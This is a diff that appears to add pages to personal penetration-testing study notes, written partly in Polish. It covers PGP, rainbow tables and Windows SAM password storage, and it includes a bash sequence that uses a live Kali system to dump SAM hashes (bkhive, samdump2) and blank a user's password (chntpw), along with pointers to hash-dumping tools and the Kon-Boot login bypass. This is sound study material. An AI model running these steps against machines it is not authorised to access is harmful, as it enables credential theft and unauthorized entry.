@@ -287,3 +287,98 @@ sequenceDiagram
     Client->>Server: Wysyła zaszyfrowane dane
     Server->>Client: Odszyfrowuje dane i odpowiada
 ```
+
+# PGP (Preety Good Privacy)
+PGP, czyli Pretty Good Privacy, używa kombinacji symetrycznego i asymetrycznego szyfrowania do zabezpieczenia komunikacji. Oto ogólny sposób, w jaki PGP działa:
+
+1. **Symetryczne szyfrowanie**: PGP zaczyna od generowania losowego klucza (zwany symetrycznym kluczem sesyjnym) do szyfrowania wiadomości. Ten klucz jest używany tylko do jednego przesłania danych i jest szyfrowany za pomocą klucza publicznego odbiorcy.
+    
+2. **Asymetryczne szyfrowanie**: Każdy użytkownik PGP ma parę kluczy - publiczny i prywatny. Klucz publiczny służy do szyfrowania wiadomości, podczas gdy klucz prywatny jest używany do deszyfrowania tych wiadomości. Nadawca używa klucza publicznego odbiorcy do zaszyfrowania wygenerowanego wcześniej klucza symetrycznego.
+    
+3. **Podpisywanie cyfrowe**: Nadawca może również podpisać swoją wiadomość przy użyciu swojego klucza prywatnego. Podpis cyfrowy służy do potwierdzenia autentyczności nadawcy i integralności wiadomości.
+    
+4. **Przesyłanie wiadomości**: Zaszyfrowana wiadomość oraz ewentualny podpis cyfrowy są przesyłane do odbiorcy. Odbiorca używa swojego klucza prywatnego do odszyfrowania klucza symetrycznego, którym z kolei odszyfrowuje całą wiadomość.
+    
+
+Dzięki temu podejściu PGP zapewnia bezpieczną komunikację, ponieważ tylko odbiorca, mający odpowiedni klucz prywatny, może odczytać zawartość wiadomości, a podpis cyfrowy umożliwia potwierdzenie tożsamości nadawcy i integralności przesyłanych danych.
+
+![[Pasted image 20240103102918.png]]
+
+# SSH
+[[(reverse) shell]]
+# Cryptographic Attacks
+![[Pasted image 20240103105412.png]]
+![[Pasted image 20240103105435.png]]
+![[Pasted image 20240103105552.png]]
+https://kestas.kuliukas.com/RainbowTables/
+Here you can download some free rainbow tables - http://ophcrack.sourceforge.net/tables.php
+You can also generate them with the tool 'rtgen.exe' - http://project-rainbowcrack.com/index.htm#download
+# Windows Passwords
+![[Pasted image 20240103113009.png]]
+﻿
+
+All the passwords in Windows (except in Domain Controller configuration) are stored in a configuration database called SAM. 
+The **Security Accounts Manager** (SAM) is a database stored as a registry file in Windows NT, Windows 2000, and later versions of Windows.
+﻿
+
+It stores users' passwords in a hashed format:
+* LM hash
+* NT hash
+
+These hashes are stored in the Windows SAM file. This file is located on your system at: *C:\Windows\System32\config*. 
+But, it is not accessible while the operating system is running.
+
+These values are also stored in the registry at:
+*HKEY LOCAL MACHINE\SAM*
+But again this area of the registry is also not accessible while the operating system is running and requires *SYSTEM* privileges anyway.
+## Stealing hash
+### Remotely 
+﻿In this case, passwords are dumped from the memory of remote system, by loading the password dumping program from remote.
+This requires at least an administrative account.
+This can done by using tools such as:
++ pwdump http://www.foofus.net/fizzgig/pwdump/
++ fgdump http://foofus.net/goons/fizzgig/fgdump/
++ ophcrack http://ophcrack.sourceforge.net/
+### Locally
+Here you need physical access to the machine. At this point there are two cases:
+* Running system - In this case, a local administrator account is required to download hashes from the memory.
+* Off-line system - In this, passwords hashes are decrypted from the offline password storage file SAM. The key to decrypt SAM is stored in SYSTEM file.
+
+**STEAL HASH/OVERWRITE HASH**
+z wyłaczonej maszyny za pomocą wersji live kali linux 
+```bash
+# terminalu live kali
+#  mount the partition where Windows is installed and then move in the folder
+root@root: mkdir /mnt/sda1
+root@root: mount -t ntfs /dev/sda1 /mnt/sda1 
+root@root: cd /mnt/sda1/WINDOWS/system32/config/
+
+# dump hashy uzytkowników
+root@root: bkhive system syskey.txt # dla Win7 to bkhive SYSTEM syskey.txt 
+root@root: samdump2 SAM syskey.txt > hashdump.txt
+root@root: cat hashdump.txt
+
+# usuń hasła użytkowników
+root@root: chntpw -l /mnt/sda1/WINDOWS/system32/config/SAM # find all existing users on the Windows machine
+root@root: chntpw -u Workgroup SAM # Select the user whose password you want to remove. In my case is “Workgroup”.
+# After executing the command it shows you different options. All you have to do is proceed by selecting option 1 “Clear (blank) user password” to remove the Windows password.
+# Then press “q” and “y” to save the changes.
+
+```
+**BYPASS LOGIN**
+[Kon-Boot](http://www.piotrbania.com/all/kon-boot/) is a software which allows to change contents of a Linux and Windows kernel on the fly (while booting). It allows to log into a system as 'root' user without typing the correct password or to elevate privileges from current user to root. It allows to enter any password protected profile without any knowledge of the password.
+
+# Malware definitions
+* **Malware** - software written to cause damage or infiltrate computer systems without the owner's informed consent. It is a general term used to represent various forms of intrusive, hostile and/or annoying code.
+* **Virus** - ﻿computer program that copies itself and spreads without the permission or knowledge of the owner. Viruses do not spread via exploiting vulnerabilities (the ones that do that are called worms).
+* **Trojan horse** (or simply trojan) is a kind of malware that appears to the user to perform a function, but in-fact facilitates unauthorized access to the owner's system. They are not self-replicating unlike viruses.
+* **Rootkit** is a malware which is designed to hide the fact that a compromise has already been done or to do the compromise at a deeper level. They are basically installed as drivers (or kernel modules).
+* A **backdoor** is a software (or modification to the software) which helps in bypassing authentication mechanism, keeping remote access open (for later unauthorized purpose) which trying to remain hidden.
+* ﻿**Adware** is basically advertising supported software which displays ads from time-to-time during the use of the software.
+* ﻿A **spyware** is a software(kind of malware) which keeps on spying the user activities such as collecting user information (what he types), his website visiting record and other information without the consent of the computer owner.
+* ﻿**Greyware** is a collective name of spyware and adware.
+* ﻿A **dialer** is a software which is used to connect to the internet but instead of connecting to normal numbers, they connect to premium numbers which are charged highly.
+* ﻿**Key-loggers** are malware which log down key pressed by the key-owner without the consent of the owner. Thus, the person is unaware that his actions are being monitored.
+* ﻿**Botnet** refers to a collection of compromised computers which run commands automatically and autonomously (with the help of command and control server).
+* **Ransomware** ﻿is a software which locks down important files with a password and then demands from the user to send money and in return promises to unlock files.
+* ﻿**Worms** are basically software which use network/system vulnerabilities to spread themselves from system to system. They are typically part of other software such as rootkit and are normally the entry point into the system.
